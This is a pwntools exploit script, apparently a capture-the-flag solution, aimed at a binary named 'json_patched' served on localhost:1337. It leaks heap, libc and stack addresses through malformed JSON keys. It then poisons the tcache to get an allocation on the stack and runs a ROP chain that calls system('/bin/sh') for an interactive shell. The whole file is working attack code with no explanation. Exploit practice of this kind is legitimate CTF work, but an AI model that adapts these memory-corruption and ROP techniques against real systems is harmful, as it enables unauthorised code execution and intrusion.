from pwn import *

if not args.REMOTE:
    elf = ELF("./json_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.arch = 'amd64'

def u64v(b: bytes) -> int:
    return u64(b.ljust(8, b'\x00'))

gdbscript = '''
c
'''

def conn(debug=False):
    if args.REMOTE:
        return remote("localhost", 1337)    
    io = process([elf.path], aslr=False)
    if args.DEBUG or debug:
        gdb.attach(io, exe=elf.path, gdbscript=gdbscript)
    return io

io = conn(True)

io.recvuntil(b"> ")

def json(data, wait=True):
    if isinstance(data, str):
        data = data.encode()
    io.sendline(data)
    if wait:
        return io.recvuntil(b"\n> ", drop=True)


# Leak heap
s = json('{[1,2]: 1}')
heap_leak = u64v(s.split(b'"')[1])
print("heap:", hex(heap_leak))


# Leak libc
json(b'"' + b"A"*0x500 + b'"')
s = json('{%s: null}' % (heap_leak-0xa0))
libc.address = u64v(s.split(b'"')[1]) - 0x21acf0
print("libc:", hex(libc.address))

# Leak stack
s = json('{%s: null}' % (libc.symbols["environ"]))
stack_leak = u64v(s.split(b'"')[1]) - 0x1138
print("stack:", hex(stack_leak))



# Place pointer to stack on heap

json(b'"' + b"A"*0x500 + p64(stack_leak+0x800).rstrip(b'\x00') + b'"')


# Set up heap on stack

s = b'{"' + b"B"*(0x500-0x10) + b'": [123, 456, 789 }'



s = s.ljust(0x800 - 0x8, b'\x00')

s += p64(0x31) + p64(0) + p64(stack_leak+0x820) + p64(0)
s += p64(0x31) + p64(0xcafebabe) + p64(2) + p64(0)

json(s)


# Tcache poisoning -> ROP -> win

add_rsp_gadget = libc.address + 0x00149808  # add rsp, 0x820; pop rbp; pop r12; pop r13; ret;
ret_gadget     = libc.address + 0x00029139  # ret;
pop_rdi        = libc.address + 0x0002a3e5  # pop rdi; ret;

s = b'["'+ b'A'*0x20 + b'", "' + b"A"*0x18 + p64(add_rsp_gadget).rstrip(b'\x00') + b'"]'
s = s.ljust(0x800 - 0x8, b'\x00')
s += p64(0x31) + p64((stack_leak-0x30) ^ ((stack_leak+0x800)>>12)) + p64(0)

s += p64(ret_gadget)*0x10

s += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
s += p64(libc.symbols["system"])



pause()

json(s, wait=False)

io.interactive()
